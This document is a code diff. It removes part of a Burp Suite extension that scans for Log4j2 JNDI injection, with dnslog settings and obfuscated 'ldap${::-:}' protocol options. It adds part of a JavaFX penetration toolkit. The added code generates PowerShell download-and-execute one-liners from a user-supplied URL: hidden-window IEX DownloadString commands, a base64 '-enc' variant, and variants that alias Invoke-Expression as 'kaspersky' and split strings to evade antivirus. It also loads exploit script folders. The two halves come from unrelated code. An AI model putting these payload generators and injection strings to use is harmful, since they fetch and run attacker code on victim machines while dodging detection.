-                BurpExtender.this.field22 = new JTextField(); // 自定义dnslog的地址
-
-                JLabel label33 = new JLabel("privatednsResponseurl:");
-                BurpExtender.this.field33 = new JTextArea(); // 自定义dnslog响应查看地址
-
-//                JLabel label44 = new JLabel("privatednsResponseheader:");
-//                JTextField privatednsResponseheader_field = new JTextField(16); // 自定义dnslog响应请求头
-
-                GroupLayout layout12 = new GroupLayout(panel12);
-                panel12.setLayout(layout12);
-                layout12.setAutoCreateGaps(true);
-                layout12.setAutoCreateContainerGaps(true);
-                layout12.setHorizontalGroup(layout12.createSequentialGroup()
-                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.TRAILING)
-                                .addComponent(label12))
-
-                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.LEADING)
-                                .addComponent(BurpExtender.this.log4j2passivepattern_box))
-                );
-
-                layout12.setVerticalGroup(layout12.createSequentialGroup()
-                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label12)
-                                .addComponent(BurpExtender.this.log4j2passivepattern_box))
-
-                );
-
-
-                GroupLayout layout = new GroupLayout(panel2);
-                panel2.setLayout(layout);
-                layout.setAutoCreateGaps(true);
-                layout.setAutoCreateContainerGaps(true);
-                layout.setHorizontalGroup(layout.createSequentialGroup()
-                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
-                                .addComponent(label1)
-                                .addComponent(label2)
-                                .addComponent(label3))
-
-                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
-                                .addComponent(BurpExtender.this.isuseceye_box)
-                                .addComponent(BurpExtender.this.field2)
-                                .addComponent(BurpExtender.this.field3))
-                );
-
-                layout.setVerticalGroup(layout.createSequentialGroup()
-                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label1)
-                                .addComponent(BurpExtender.this.isuseceye_box))
-
-                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label2)
-                                .addComponent(BurpExtender.this.field2))
-
-                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label3)
-                                .addComponent(BurpExtender.this.field3))
-                );
-
-
-
-                GroupLayout layout2 = new GroupLayout(panel22);
-                panel22.setLayout(layout2);
-                layout2.setAutoCreateGaps(true);
-                layout2.setAutoCreateContainerGaps(true);
-                layout2.setHorizontalGroup(layout2.createSequentialGroup()
-                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.TRAILING)
-                                .addComponent(label11)
-                                .addComponent(label111)
-                                .addComponent(label22)
-                                .addComponent(label33))
-
-                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.LEADING)
-                                .addComponent(BurpExtender.this.isuseprivatedns_box)
-                                .addComponent(BurpExtender.this.isip_box)
-                                .addComponent(BurpExtender.this.field22)
-                                .addComponent(BurpExtender.this.field33))
-                );
-
-                layout2.setVerticalGroup(layout2.createSequentialGroup()
-                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label11)
-                                .addComponent(BurpExtender.this.isuseprivatedns_box))
-
-                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label111)
-                                .addComponent(BurpExtender.this.isip_box))
-
-                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label22)
-                                .addComponent(BurpExtender.this.field22))
-
-                        .addGroup(layout2.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(label33)
-                                .addComponent(BurpExtender.this.field33))
-                );
-
-                panel.add(panel12);
-                panel.add(panel2);
-                panel.add(panel22);
-
-                panel3.add(btn1);
-                panel3.add(btn2);
-                panel3.add(btn3);
-                panel.add(panel3);
-
-                BurpExtender.this.Rtable2.addTab("dnslog configuration",panel); //将dnslog 配置添加到JTabbedPane
-
-                JPanel panell = new JPanel(); // 创建一个可自定义参数页面，进行配置自定义参数扫描
-                panell.setAlignmentX(0.0f);
-                panell.setLayout(new BoxLayout(panell, BoxLayout.Y_AXIS));
-                panell.setBorder(new EmptyBorder(10, 10, 10, 10));
-
-
-                JPanel panell2 = new JPanel();// 自定义参数 可视化的模块
-                panell2.setBorder(BorderFactory.createTitledBorder("custom params(including bypass)")); // 自定义参数
-                panell2.setLayout(new BoxLayout(panel2, BoxLayout.X_AXIS));
-
-                JPanel panell3 = new JPanel(); // 按钮模块
-                panel3.setLayout(new BoxLayout(panel3, BoxLayout.X_AXIS));
-
-                JLabel labell1 = new JLabel("jndiparam:");
-                BurpExtender.this.fieldd1 = new JTextField(); // jndi参数
-
-                JLabel labell2 = new JLabel("dnsldaprmi:");
-                String[] sg = { "dns", "ldap", "rmi" ,"dns${::-:}", "ldap${::-:}" ,"rmi${::-:}"};
-                BurpExtender.this.fieldd2 = new JComboBox(sg); // 协议名称dns ldap rmi
-
-                JLabel labell3 = new JLabel("white lists:");
-                BurpExtender.this.whitelists_area = new JTextArea(4,40);
-                BurpExtender.this.whitelists_area.setLineWrap(true);
-
-                JLabel labell4 = new JLabel("custom headers lists:");
-                BurpExtender.this.customheaders_area = new JTextArea(4,40);
-                BurpExtender.this.customheaders_area.setLineWrap(true);
-
-
-                JPanel panelOutput = new JPanel();
-                panelOutput.add(new JScrollPane(BurpExtender.this.whitelists_area));
-
-                JPanel panelOutput2 = new JPanel();
-                panelOutput2.add(new JScrollPane(BurpExtender.this.customheaders_area));
-
-                /**
-                 * isuseUserAgentTokenXff=1
-                 * isuseXfflists=0
-                 * isuseAllCookie=1
-                 * isuseRefererOrigin=0
-                 * isuseAccept=0
-                 */
-
-                JLabel isuseUserAgentTokenXff_label = new JLabel("test UserAgentTokenXff");
-                BurpExtender.this.isuseUserAgentTokenXff_CheckBox = new JCheckBox();
-
-                JLabel isuseXfflists_label = new JLabel("test Xfflists:");
-                BurpExtender.this.isuseXfflists_CheckBox = new JCheckBox();
-
-                JLabel isuseAllCookie_label = new JLabel("test Cookie:");
-                BurpExtender.this.isuseAllCookie_CheckBox = new JCheckBox();
-
-                JLabel isuseRefererOrigin_label = new JLabel("test RefererOrigin:");
-                BurpExtender.this.isuseRefererOrigin_CheckBox = new JCheckBox();
-
-                JLabel isuseContenttype_label = new JLabel("test Contenttype:");
-                BurpExtender.this.isuseContenttype_CheckBox = new JCheckBox();
-
-                JLabel isuseAccept_label = new JLabel("test Accept:");
-                BurpExtender.this.isuseAccept_CheckBox = new JCheckBox();
-
-                GroupLayout layoutt1 = new GroupLayout(panell2);
-                panell2.setLayout(layoutt1);
-                layoutt1.setAutoCreateGaps(true);
-                layoutt1.setAutoCreateContainerGaps(true);
-                layoutt1.setHorizontalGroup(layoutt1.createSequentialGroup()
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.TRAILING)
-                                .addComponent(labell1)
-                                .addComponent(labell2)
-                                .addComponent(labell3)
-                                .addComponent(labell4)
-                                .addComponent(isuseUserAgentTokenXff_label)
-                                .addComponent(isuseXfflists_label)
-                                .addComponent(isuseAllCookie_label)
-                                .addComponent(isuseRefererOrigin_label)
-                                .addComponent(isuseContenttype_label)
-                                .addComponent(isuseAccept_label))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.LEADING)
-                                .addComponent(BurpExtender.this.fieldd1)
-                                .addComponent(BurpExtender.this.fieldd2)
-                                .addComponent(panelOutput)
-                                .addComponent(panelOutput2)
-                                .addComponent(BurpExtender.this.isuseUserAgentTokenXff_CheckBox)
-                                .addComponent(BurpExtender.this.isuseXfflists_CheckBox)
-                                .addComponent(BurpExtender.this.isuseAllCookie_CheckBox)
-                                .addComponent(BurpExtender.this.isuseRefererOrigin_CheckBox)
-                                .addComponent(BurpExtender.this.isuseContenttype_CheckBox)
-                                .addComponent(BurpExtender.this.isuseAccept_CheckBox))
-                );
-
-                layoutt1.setVerticalGroup(layoutt1.createSequentialGroup()
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(labell1)
-                                .addComponent(BurpExtender.this.fieldd1))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(labell2)
-                                .addComponent(BurpExtender.this.fieldd2))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(labell3)
-                                .addComponent(panelOutput))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(labell4)
-                                .addComponent(panelOutput2))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(isuseUserAgentTokenXff_label)
-                                .addComponent(BurpExtender.this.isuseUserAgentTokenXff_CheckBox))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(isuseXfflists_label)
-                                .addComponent(BurpExtender.this.isuseXfflists_CheckBox))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(isuseAllCookie_label)
-                                .addComponent(BurpExtender.this.isuseAllCookie_CheckBox))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(isuseRefererOrigin_label)
-                                .addComponent(BurpExtender.this.isuseRefererOrigin_CheckBox))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(isuseContenttype_label)
-                                .addComponent(BurpExtender.this.isuseContenttype_CheckBox))
-
-                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
-                                .addComponent(isuseAccept_label)
-                                .addComponent(BurpExtender.this.isuseAccept_CheckBox))
-                );
-
-
-                JButton btn_1 = new JButton("Save configuration");
-                btn_1.addMouseListener(new MouseAdapter() {
-                    @Override
-                    public void mouseClicked(MouseEvent e) {
-//                        JOptionPane.showMessageDialog(null, "Save Success!", "Save", JOptionPane.INFORMATION_MESSAGE);
-                        String total = "";
-//                        if (log4j2passivepattern_box.isSelected()){ //写入是否使用log4j2被动扫描 参数
-//                            total = total + "uselog4j2=1\n";
-//                        }else{
-//                            total = total + "uselog4j2=0\n";
-//                        }
-
-                        if (isuseceye_box.isSelected()){ //写入isuseceye参数
-                            total = total + "isuseceye=1\n";
-                        }else{
-                            total = total + "isuseceye=0\n";
-                        }
-                        total = total + "ceyetoken=" + field2.getText().trim() + "\n"; // 写入ceye token参数
-                        total = total + "ceyednslog=" + field3.getText().trim() + "\n"; // 写入ceye 平台记录的地址
-
-                        if (isuseprivatedns_box.isSelected()){ // 写入isuseprivatedns参数
-                            total = total + "isuseprivatedns=1\n";
-                        }else{ total = total + "isuseprivatedns=0\n"; }
-
-                        if (isip_box.isSelected()){ // 写入isip参数
-                            total = total + "isip=1\n";
-                        }else{ total = total + "isip=0\n"; }
-
-                        total = total + "privatednslogurl=" + field22.getText().trim() + "\n"; // 写入自定义dnslog参数
-                        total = total + "privatednsResponseurl=" + field33.getText().trim() + "\n"; // 写入自定义dnslog响应查看地址
-                        total = total + "jndiparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
-                        total = total + "dnsldaprmi=" + fieldd2.getSelectedItem().toString().trim() + "\n"; // 写入协议名称dns ldap rmi
-                        total = total + "whitelists=" + whitelists_area.getText().replace("\n","、").trim() + "\n"; // 写入协议名称dns ldap rmi
-                        total = total + "customlists=" + customheaders_area.getText().replace("\n","、").trim() + "\n"; // 写入自定义参数
-
-                        if (isuseUserAgentTokenXff_CheckBox.isSelected()){ // 写入isuseUserAgentTokenXff参数
-                            total = total + "isuseUserAgentTokenXff=1\n";
-                        }else{ total = total + "isuseUserAgentTokenXff=0\n"; }
-
-                        if (isuseXfflists_CheckBox.isSelected()){ // 写入isip参数
-                            total = total + "isuseXfflists=1\n";
-                        }else{ total = total + "isuseXfflists=0\n"; }
-
-                        if (isuseAllCookie_CheckBox.isSelected()){ // 写入isuseprivatedns参数
-                            total = total + "isuseAllCookie=1\n";
-                        }else{ total = total + "isuseAllCookie=0\n"; }
-
-                        if (isuseRefererOrigin_CheckBox.isSelected()){ // 写入refereroringin参数
-                            total = total + "isuseRefererOrigin=1\n";
-                        }else{
-                            total = total + "isuseRefererOrigin=0\n"; }
-
-                        if (isuseContenttype_CheckBox.isSelected()){ // 写入Contenttype参数
-                            total = total + "isuseContenttype=1\n";
-                        }else{
-                            total = total + "isuseContenttype=0\n"; }
-
-                        if (isuseAccept_CheckBox.isSelected()){ // 写入accept参数
-                            total = total + "isuseAccept=1\n";
-                        }else{ total = total + "isuseAccept=0\n"; }
-
-                        try (FileWriter fileWriter = new FileWriter(f.getAbsolutePath())) {
-                            fileWriter.append(total);
-                        } catch (IOException ee) {
-                            ee.printStackTrace();
-                        }
-
-                        String use_dnslog = "";
-
-                        if (total.contains("isuseceye=1"))
-                            use_dnslog = FileGetValue(f,"ceyednslog");
-                        else if (total.contains("isuseprivatedns=1"))
-                            use_dnslog = FileGetValue(f,"privatednslogurl");
-                        else
-                            use_dnslog = finalLogxn_dnslog1;
-
-                        String Content = "";// 按钮返回的内容
-                        Content = "Save Success!\nyou use dnslog is :" + use_dnslog;
-                        if (use_dnslog.contains("need to configure ceye api"))
-                            Content = "Fail!\nyou need to Configure dnslog and the default dnslog can't access";
-
-                        JOptionPane.showMessageDialog(null, Content , "Save", JOptionPane.INFORMATION_MESSAGE);
-                    }
-                });
-
-                JButton btn_2 = new JButton("Restore/Loading latest params");
-                btn_2.addMouseListener(new MouseAdapter() {
-                    @Override
-                    public void mouseClicked(MouseEvent e){
-                        BurpExtender.this.log4j2passivepattern_box.setSelected(true);
-                        BurpExtender.this.isuseceye_box.setSelected(false);
-                        BurpExtender.this.isuseprivatedns_box.setSelected(false);
-                        BurpExtender.this.isip_box.setSelected(false);
-                        BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(true);
-                        BurpExtender.this.isuseXfflists_CheckBox.setSelected(false);
-                        BurpExtender.this.isuseAllCookie_CheckBox.setSelected(true);
-                        BurpExtender.this.isuseRefererOrigin_CheckBox.setSelected(false);
-                        BurpExtender.this.isuseContenttype_CheckBox.setSelected(false);
-                        BurpExtender.this.isuseAccept_CheckBox.setSelected(false);
-
-                        fieldd1.setText("jndi:");
-                        fieldd2.setSelectedIndex(0);
-                        field2.setText("xxxxxxxxxx");
-                        field3.setText("xxxxx.ceye.io");
-                        field22.setText("x.x.x.x");
-                        field33.setLineWrap(true);
-                        field33.setText("http://x.x.x.x/repoonsetoken=[token]");
-                        whitelists_area.setText("*.gov.cn\n*.edu.cn");
-                        customheaders_area.setText("X-Client-IP\nX-Requested-With\nX-Api-Version");
-                    }
-                });
-
-                panell3.add(btn_1);
-                panell3.add(btn_2);
-                panell.add(panell2);
-                panell.add(panell3);
-
-                BurpExtender.this.Rtable2.addTab("custom params",panell); //将自定义参数页面添加到JTabbedPane
-
-                BurpExtender.this.HResponseTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
-                BurpExtender.this.Rtable.addTab("Response", BurpExtender.this.HResponseTextEditor.getComponent());
-                BurpExtender.this.Rtable.addTab("Config", BurpExtender.this.Rtable2);
-
-
-                BufferedReader reader = null;
-                StringBuffer sbf = new StringBuffer();
-                String output = "";
-                try {
-                    reader = new BufferedReader(new FileReader(f));
-                    String tempStr;
-                    while ((tempStr = reader.readLine()) != null) {
-                        sbf.append(tempStr + '\n');
-                    }
-                    reader.close();
-                    output =  sbf.toString();
-                } catch (IOException e) {}
-                BurpExtender.this.textArea1.setText(output);
-
-                // 设置默认属性
-//                if (FileGetValue(f, "uselog4j2").equals("1"))
-//                    BurpExtender.this.log4j2passivepattern_box.setSelected(true);
-//                else
-//                    BurpExtender.this.log4j2passivepattern_box.setSelected(false);
-                BurpExtender.this.log4j2passivepattern_box.setSelected(true);
-                if (FileGetValue(f,"isuseceye").equals("1"))
-                    BurpExtender.this.isuseceye_box.setSelected(true); // 是否使用ceye的dns平台
-                else
-                    BurpExtender.this.isuseceye_box.setSelected(false);
-
-                if (FileGetValue(f,"isuseprivatedns").equals("1")) // 是否使用自定义dns
-                    BurpExtender.this.isuseprivatedns_box.setSelected(true);
-                else
-                    BurpExtender.this.isuseprivatedns_box.setSelected(false);
-
-                if (FileGetValue(f,"isip").equals("1")) // 自定义dns是否为ip
-                    BurpExtender.this.isip_box.setSelected(true);
-                else
-                    BurpExtender.this.isip_box.setSelected(false);
-
-                if (FileGetValue(f,"isuseUserAgentTokenXff").equals("1")) // 是否使用UA、Token、XFF扫描
-                    BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(true);
-                else
-                    BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(false);
-
-                if (FileGetValue(f,"isuseXfflists").equals("1")) // 是否使用xff lists扫描
-                    BurpExtender.this.isuseXfflists_CheckBox.setSelected(true);
-                else
-                    BurpExtender.this.isuseXfflists_CheckBox.setSelected(false);
-
-                if (FileGetValue(f,"isuseAllCookie").equals("1")) // 是否全部cookie扫描
-                    BurpExtender.this.isuseAllCookie_CheckBox.setSelected(true);
-                else
-                    BurpExtender.this.isuseAllCookie_CheckBox.setSelected(false);
-
-                if (FileGetValue(f,"isuseRefererOrigin").equals("1")) // 是否使用refer、origin扫描
-                    BurpExtender.this.isuseRefererOrigin_CheckBox.setSelected(true);
-                else
-                    BurpExtender.this.isuseRefererOrigin_CheckBox.setSelected(false);
-
-                if (FileGetValue(f,"isuseContenttype").equals("1")) // 是否使用refer、origin扫描
-                    BurpExtender.this.isuseContenttype_CheckBox.setSelected(true);
-                else
-                    BurpExtender.this.isuseContenttype_CheckBox.setSelected(false);
-
-                if (FileGetValue(f,"isuseAccept").equals("1")) // 是否使用Accept参数扫描
-                    BurpExtender.this.isuseAccept_CheckBox.setSelected(true);
-                else
-                    BurpExtender.this.isuseAccept_CheckBox.setSelected(false);
-
-                String jndi_param = FileGetValue(f, "jndiparam"); // jndi参数
-                fieldd1.setText(jndi_param);
-
-                String dnsldaprmi_param = FileGetValue(f, "dnsldaprmi"); // dnsldaprmi 参数
-                if (dnsldaprmi_param.equals("dns"))
-                    fieldd2.setSelectedIndex(0);
-                if (dnsldaprmi_param.equals("ldap"))
-                    fieldd2.setSelectedIndex(1);
-                if (dnsldaprmi_param.equals("rmi"))
-                    fieldd2.setSelectedIndex(2);
-                if (dnsldaprmi_param.equals("dns${::-:}"))
-                    fieldd2.setSelectedIndex(3);
-                if (dnsldaprmi_param.equals("ldap${::-:}"))
-                    fieldd2.setSelectedIndex(4);
-                if (dnsldaprmi_param.equals("rmi${::-:}"))
-                    fieldd2.setSelectedIndex(5);
-
-
-                String ceyetoken_param = FileGetValue(f, "ceyetoken"); // ceye的token 参数
-                field2.setText(ceyetoken_param);
-
-                String ceyednslog_param = FileGetValue(f, "ceyednslog"); // ceye的地址 参数
-                field3.setText(ceyednslog_param);
-
-                String privatednslogurl_param = FileGetValue(f, "privatednslogurl"); // 自定义dnslog 参数
-                field22.setText(privatednslogurl_param);
-
-                String privatednsResponseurl_param = FileGetValue(f, "privatednsResponseurl"); // dnsldaprmi 参数
-                field33.setLineWrap(true);
-                field33.setText(privatednsResponseurl_param);
-
-                String white_lists_param = FileGetValue(f,"whitelists");
-                whitelists_area.setText(white_lists_param.replace("、","\n"));
-
-                String headers_lists_param = FileGetValue(f,"customlists");
-                customheaders_area.setText(headers_lists_param.replace("、","\n"));
-
-
-                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Ltable, "left"); // request窗体
-                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Rtable, "right"); // response窗体
-                BurpExtender.this.HjSplitPane.setEnabled(false); //分割线禁止变动
-                BurpExtender.this.mjSplitPane.add(BurpExtender.this.UscrollPane, "left"); // 结果集
-                BurpExtender.this.mjSplitPane.add(BurpExtender.this.HjSplitPane, "right"); // request response一起
-
-                BurpExtender.this.callbacks.customizeUiComponent(BurpExtender.this.mjSplitPane);
-                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
-            }
-        });
-        callbacks.registerScannerCheck(this);
-        callbacks.registerContextMenuFactory(this);
-    }
-
-
-    public String headers_to_host(List<String> request_header){
-        for (String request_header_single : request_header){
-            if (request_header_single.substring(0,5).contains("Host") || request_header_single.substring(0,5).contains("host")){
-                String[] request_header_single_lists = request_header_single.split(":");
-                return request_header_single_lists[1].trim();
+        //下面为cspayload自动生成模块，初始化
+        String inputString = mTextField9.getText().trim();
+        String outputString1 = "";
+        String outputString2 = "";
+        String outputString3 = "";
+        String outputString4 = "";
+
+        outputString1 = "powershell -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('" + inputString.substring(0,2) +"'+'" + inputString.substring(2) + "'))\"";
+        mTextArea16.setText(outputString1); // 第一个框
+
+        String strtest = "IEX (New-Object System.Net.Webclient).DownloadString('" + inputString + "')";
+
+        byte[] sb2 = strtest.getBytes();
+        int ii = 0;
+        byte[] bt3 = new byte[sb2.length+sb2.length];
+        for (byte btest:sb2) {
+            bt3[ii++] = btest;
+            bt3[ii++] = (byte)0x00;
+        }
+        String str= new String (bt3);
+        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
+        mTextArea17.setText("powershell -enc " + base64encodedString); // 第二个框
+
+
+        outputString2 = "powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('" +  inputString + "')\"";
+        mTextArea18.setText(outputString2); // 第三个框
+
+        outputString3 = "powershell set-alias -name kaspersky -value Invoke-Expression;\"$a1='kaspersky ((new-object net.webclient).downl';$a2='oadstring(''" +  inputString + "''))';$a3=$a1,$a2;kaspersky(-join $a3)\"";
+        mTextArea19.setText(outputString3); // 第四个框
+
+        outputString4 = "powershell -NoExit $c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''" +  inputString + "'')'.Replace('123','adString');IEX ($c1+$c2)";
+        mTextArea20.setText(outputString4); // 第五个框
+        // 上面为cspayload自动生成模块，初始化
+
+        ObservableList<String> strList = dirnametlistview1("poc");
+
+        if(os.toLowerCase().startsWith("win")) {
+            for (int i = 0; i < strList.size(); i++) {
+                String[] strlist_list = strList.get(i).split("\\\\");
+                strList.set(i, strlist_list[strlist_list.length-1]);
             }
         }
-        return null;
+
+        mListView1.setItems(strList);
+        mTextArea.setWrapText(true);// 自动换行
+        mTextArea3.setWrapText(true); // 自动换行
+
+        ObservableList<String> keylist = readFilestokey("property/cmdlists.txt");
+        mListView3.setItems(keylist);
+        mTextArea8.setWrapText(true); // 自动换行
+
+        ObservableList<String> strList2 = dirnametlistview1("pythonexp"); //python脚本显示页面
+        if(os.toLowerCase().startsWith("win")) {
+            for (int i = 0; i < strList2.size(); i++) {
+                String[] strlist_list2 = strList2.get(i).split("\\\\");
+                strList2.set(i, strlist_list2[strlist_list2.length-1]);
+            }
+        }
+
+        mListView4.setItems(strList2);
+        mTextArea9.setWrapText(true); // 自动换行
+        mTextArea10.setWrapText(true); // 自动换行
+        mTextArea11.setWrapText(true); // 自动换行
+        mTextArea12.setWrapText(true); // 自动换行
+
+        mTextArea13.setWrapText(true); // 自动换行
+        mTextArea14.setWrapText(true); // 自动换行
+        mTextArea15.setWrapText(true); // 自动换行
+
+        mTextArea16.setWrapText(true); // 自动换行
+        mTextArea17.setWrapText(true); // 自动换行
+        mTextArea18.setWrapText(true); // 自动换行
+        mTextArea19.setWrapText(true); // 自动换行
+        mTextArea20.setWrapText(true); // 自动换行
+        mTextArea21.setWrapText(true); // 自动换行
+        mTextArea22.setWrapText(true); // 自动换行
+        mTextArea24.setWrapText(true); // 自动换行
+        mTextArea25.setWrapText(true); // 自动换行
+        mTextArea26.setWrapText(true); // 自动换行
+        mTextArea27.setWrapText(true); // 自动换行
+        mTextArea28.setWrapText(true); // 自动换行
+        mTextArea29.setWrapText(true); // 自动换行
+        mTextArea30.setWrapText(true); // 自动换行
+        mTextArea33.setText(".html\n.xsd\n//\n/springframework/");
+
+        //mLabeltest2.setText("");
+
+        ToggleGroup tg = new ToggleGroup(); // radiobutton单选
+        mRadiobutton3.setToggleGroup(tg);
+        mRadiobutton4.setToggleGroup(tg);
+        mRadiobutton5.setToggleGroup(tg);
+        mRadiobutton6.setToggleGroup(tg);
+
+        ToggleGroup tg2 = new ToggleGroup(); // radiobutton单选
+        mRadiobutton7.setToggleGroup(tg2);
+        mRadiobutton8.setToggleGroup(tg2);
+
+        String[] encodes_lists = new String[]{"AES", "DES", "DESede" };
+        mChoiceBox1.setItems(FXCollections.observableArrayList(
+                "AES", "DES", "DESede")
+        ); // 列出AES DES DES3 RSA加密的选项
+        mChoiceBox1.setValue("AES"); // 默认选择AES加密
+
+//        mChoiceBox1.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener() { // 监听如果为RSA加密
+//            @Override
+//            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
+//                if (encodes_lists[(int) newValue].equals("RSA")){
+//                mChoiceBox3.setItems(FXCollections.observableArrayList(
+//                        "PKCS1Padding", "OAEPWithSHA-256AndMGF1Padding","OAEPWithSHA-1AndMGF1Padding")
+//                ); // 列出填充模式
+//                mChoiceBox3.setValue("PKCS1Padding"); // 默认选择PKCS5Padding模式
+//                }
+//                if (!encodes_lists[(int) newValue].equals("RSA")){
+//                    mChoiceBox3.setItems(FXCollections.observableArrayList(
+//                             "PKCS1Padding", "OAEPWithSHA-256AndMGF1Padding","OAEPWithSHA-1AndMGF1Padding","PKCS5Padding", "NoPadding")); // 列出填充模式
+//                    mChoiceBox3.setValue("PKCS5Padding"); // 默认选择PKCS5Padding模式
+//                }
+//            }
+//        });
+
+        mChoiceBox2.setItems(FXCollections.observableArrayList(
+                "ECB", "CBC","CFB")
+        ); // 列出向量模式
+        mChoiceBox2.setValue("CBC"); // 默认选择CBC模式
+
+
+        String[] modes_lists = new String[]{"PKCS5Padding", "NoPadding"};
+        mChoiceBox3.setItems(FXCollections.observableArrayList(
+                        "PKCS5Padding", "NoPadding")); // 列出填充模式
+        mChoiceBox3.setValue("PKCS5Padding"); // 默认选择PKCS5Padding模式
+
+//        mChoiceBox3.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener() { // 监听如果为RSA的模式
+//            @Override
+//            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
+//                if (modes_lists[(int) newValue].equals("PKCS1Padding") || modes_lists[(int) newValue].equals("OAEPWithSHA-256AndMGF1Padding") || modes_lists[(int) newValue].equals("OAEPWithSHA-1AndMGF1Padding") ){
+//                    mChoiceBox1.setItems(FXCollections.observableArrayList(
+//                            "RSA")
+//                    ); // 列出填充模式
+////                    mChoiceBox1.setValue("RSA"); // 默认选择PKCS5Padding模式
+//
+//                } else if( !modes_lists[(int) newValue].equals("PKCS1Padding") && !modes_lists[(int) newValue].equals("OAEPWithSHA-256AndMGF1Padding") && !modes_lists[(int) newValue].equals("OAEPWithSHA-1AndMGF1Padding")) {
+//                    mChoiceBox1.setItems(FXCollections.observableArrayList("AES", "DES", "DES3", "RSA")
+//                    ); // 列出填充模式
+//                    mChoiceBox1.setValue("AES"); // 默认选择PKCS5Padding模式
+//                }
+//            }
+//        });
+
+        mChoiceBox4.setItems(FXCollections.observableArrayList(
+                "Base64", "Hex", "无")
+        ); // 列出密文编码
+        mChoiceBox4.setValue("无"); // 默认选择Hex
+
+        mChoiceBox5.setItems(FXCollections.observableArrayList(
+                "Base64", "Hex", "无")
+        ); // 列出密文编码
+        mChoiceBox5.setValue("无"); // 默认选择Hex
+
+
     }
 
-    public String vulnurl_param (String vulnurl, int i ,Boolean needincreasing){
-        String vulnurl_total = "";
-        if (needincreasing) {
-            String[] vulnurls = vulnurl.split("//", 2);
-            vulnurl_total = vulnurl_total + vulnurls[0] + "//" + i + "." + vulnurls[1];
-        }else
-            vulnurl_total = vulnurl;
-//        vulnurl_total = vulnurl_total.replace(".","${::-.}");
-        return vulnurl_total;
-    }
 
-    public String FileGetValue(File f, String key){ // 读取properties文件，根据key取出value
+
+    // 读取properties配置文件
+    public static String readFileByLinesproperties(String fileName) {
+        File file = new File(fileName);
         BufferedReader reader = null;
-        String value = "";
-        StringBuffer sbf = new StringBuffer();
-        String output = "";
+        String python2path = "";
+        String python3path = "";
+        String pythonpath = "";
+        String cspayload = "";
+        String pocsuitepath = "";
         try {
-            reader = new BufferedReader(new FileReader(f));
-            String tempStr;
-            while ((tempStr = reader.readLine()) != null) {
-                sbf.append(tempStr + '\n');
+            reader = new BufferedReader(new FileReader(file));
+            String tempString = null;
+            // 一次读入一行，直到读入null为文件结束
+            while ((tempString = reader.readLine()) != null) {
+                if (tempString.contains("python2path"))
+                    python2path = tempString.split("=")[1];
+                if (tempString.contains("python3path"))
+                    python3path = tempString.split("=")[1];
+                if (tempString.contains("cspayload"))
+                    cspayload = tempString.split("=")[1];
+                if (tempString.contains("pocsuite"))
+                    pocsuitepath = tempString.split("=")[1];
+
+                pythonpath = python2path + "###" + python3path + "###" +cspayload + "###" + pocsuitepath;
             }
             reader.close();
-            output =  sbf.toString();
-        } catch (IOException e) {}
-        String[] properties_lists = output.split("\n");
-        for (String str:properties_lists) {
-            String[] str_lists = str.split("=",2);
-            if (str_lists[0].equals(key))
-                value = str_lists[1];
+        } catch (IOException e) {
+            e.printStackTrace();
+        } finally {
+            return pythonpath;
         }
-        return value.trim();
     }
 
-    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
+    // 读取脚本的参数用法usage
+    //public static String readFileByoneLine(String fileName) {
+    //    File file = new File(fileName);
+    //    BufferedReader reader = null;
+    //    String pythonpath = "";
+    //    try {
+    //        reader = new BufferedReader(new FileReader(file));
+    //        String tempString = null;
